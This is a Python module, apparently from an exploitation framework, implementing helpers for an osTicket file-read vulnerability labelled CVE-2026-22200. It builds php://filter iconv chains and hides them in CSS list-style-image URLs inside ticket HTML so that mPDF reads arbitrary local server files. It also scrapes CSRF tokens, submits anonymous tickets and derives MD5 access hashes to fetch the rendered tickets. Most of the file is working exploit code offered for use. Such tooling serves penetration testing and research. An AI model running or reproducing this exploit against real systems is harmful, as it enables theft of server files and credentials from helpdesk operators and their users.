#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""osTicket helpers (CVE-2026-22200 PHP filter ticket payloads, Horizon3)."""

from __future__ import annotations

import base64
import hashlib
import re
import string
from typing import Iterable
from urllib.parse import quote

from lib.protocols.http.http_client import Http_client
from lib.protocols.http.osticket_iconv_mappings import ICONV_MAPPINGS


class Osticket(Http_client):
    """Mixin: mPDF PHP filter payloads and anonymous ticket submission."""

    @staticmethod
    def quote_with_forced_uppercase(input_string: str) -> str:
        safe_chars = string.ascii_lowercase + string.digits + "_.-~"
        encoded_parts = []
        for char in input_string:
            if "A" <= char <= "Z":
                encoded_parts.append(f"%{ord(char):X}")
            elif char in safe_chars:
                encoded_parts.append(char)
            else:
                encoded_parts.append(quote(char))
        return "".join(encoded_parts)

    def php_filter_resource_url(self, file_path: str, encoding: str = "plain") -> str:
        """Build php://filter/... chain for one local path (Horizon3 bitmap trick)."""
        if encoding not in ("plain", "b64", "b64zlib"):
            encoding = "plain"

        width, height = 15000, 1
        payload = (
            b"BM:\x00\x00\x00\x00\x00\x00\x006\x00\x00\x00(\x00\x00\x00"
            + width.to_bytes(4, "little")
            + height.to_bytes(4, "little")
            + b"\x01\x00\x18\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00"
            + b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        )
        base64_payload = base64.b64encode(payload).decode()
        filters = "convert.iconv.UTF8.CSISO2022KR|"
        filters += "convert.base64-encode|"
        filters += "convert.iconv.UTF8.UTF7|"

        for c in base64_payload[::-1]:
            filters += ICONV_MAPPINGS[(str(hex(ord(c)))).replace("0x", "")] + "|"
            filters += "convert.base64-decode|"
            filters += "convert.base64-encode|"
            filters += "convert.iconv.UTF8.UTF7|"

        filters += "convert.base64-decode"
        if encoding in ("b64", "b64zlib"):
            filters = "convert.base64-encode|" + filters
            if encoding == "b64zlib":
                filters = "zlib.deflate|" + filters

        return f"php://filter/{filters}/resource={file_path}"

    def build_ticket_style_payload(
        self,
        filter_urls: Iterable[str],
        *,
        reply: bool = False,
    ) -> str:
        sep = "&#38;&#35;&#51;&#52;" if reply else "&#34"
        html = "<ul>"
        for url in filter_urls:
            quoted = self.quote_with_forced_uppercase(url)
            html += f'<li style="list-style-image:url{sep}({quoted})">listitem</li>\n'
        html += "</ul>"
        return html

    def build_file_read_message(
        self,
        remote_paths: Iterable[str],
        *,
        reply: bool = False,
    ) -> str:
        paths = list(remote_paths)
        encodings: list[str] = []
        bare_paths: list[str] = []
        for item in paths:
            if "," in item:
                path, enc = item.split(",", 1)
                bare_paths.append(path)
                encodings.append(enc)
            else:
                bare_paths.append(item)
                encodings.append("plain")
        urls = [
            self.php_filter_resource_url(p, enc)
            for p, enc in zip(bare_paths, encodings)
        ]
        return self.build_ticket_style_payload(urls, reply=reply)

    @staticmethod
    def csrf_token(html: str) -> str | None:
        patterns = (
            r'name=["\']__CSRFToken__["\'][^>]*value=["\']([^"\']+)["\']',
            r'name=["\']csrf_token["\'][^>]*value=["\']([^"\']+)["\']',
        )
        for pattern in patterns:
            match = re.search(pattern, html or "", re.IGNORECASE)
            if match:
                return match.group(1)
        return None

    def html_richtext_topic_id(self) -> int | None:
        r = self.http_request(method="GET", path="/open.php", allow_redirects=True)
        if not r or r.status_code != 200:
            return None
        content = r.text or ""
        topic_pattern = re.compile(
            r'<option[^>]*value=["\'](\d+)["\'][^>]*>(?!.*?Select.*?Topic)',
            re.IGNORECASE,
        )
        topic_ids = [int(t) for t in topic_pattern.findall(content) if t.isdigit()]
        for topic_id in topic_ids:
            ajax = self.http_request(
                method="GET",
                path=f"/ajax.php/form/help-topic/{topic_id}/forms",
                headers={"X-Requested-With": "XMLHttpRequest"},
                allow_redirects=False,
            )
            if ajax and ajax.status_code == 200 and 'class="richtext' in (ajax.text or "").lower():
                return topic_id
        if 'class="richtext' in content.lower():
            default = re.search(
                r'name=["\']topicId["\'][^>]*value=["\'](\d+)["\']',
                content,
                re.IGNORECASE,
            )
            if default:
                return int(default.group(1))
        return None

    def submit_open_ticket(
        self,
        *,
        name: str,
        email: str,
        subject: str,
        message_html: str,
        topic_id: int | None = None,
    ):
        r = self.http_request(method="GET", path="/open.php", allow_redirects=True)
        if not r or r.status_code != 200:
            return None
        token = self.csrf_token(r.text or "")
        tid = topic_id or self.html_richtext_topic_id()
        if not tid:
            return None
        payload = {
            "a": "open",
            "subject": subject,
            "message": message_html,
            "name": name,
            "email": email,
            "topicId": str(tid),
        }
        if token:
            payload["__CSRFToken__"] = token
        return self.http_request(method="POST", path="/open.php", data=payload, allow_redirects=True)

    @staticmethod
    def view_access_hash(user_id: str, email: str, salt: str) -> str:
        combined = str(user_id) + email.lower() + salt
        return hashlib.md5(combined.encode("utf-8")).hexdigest()

    def fetch_ticket_view(
        self,
        ticket_number: str,
        email: str,
        user_id: str,
        salt: str,
    ):
        auth_hash = self.view_access_hash(user_id, email, salt)
        return self.http_request(
            method="GET",
            path="/view.php",
            params={"t": ticket_number, "e": email, "a": auth_hash},
            allow_redirects=True,
        )

    @staticmethod
    def parse_ticket_number(html: str) -> str | None:
        patterns = (
            r"ticket[#:\s]+([0-9]{3,})",
            r"Ticket\s+#([0-9]+)",
            r'"ticket_id"\s*:\s*"(\d+)"',
        )
        lower = html or ""
        for pattern in patterns:
            match = re.search(pattern, lower, re.IGNORECASE)
            if match:
                return match.group(1)
        return None
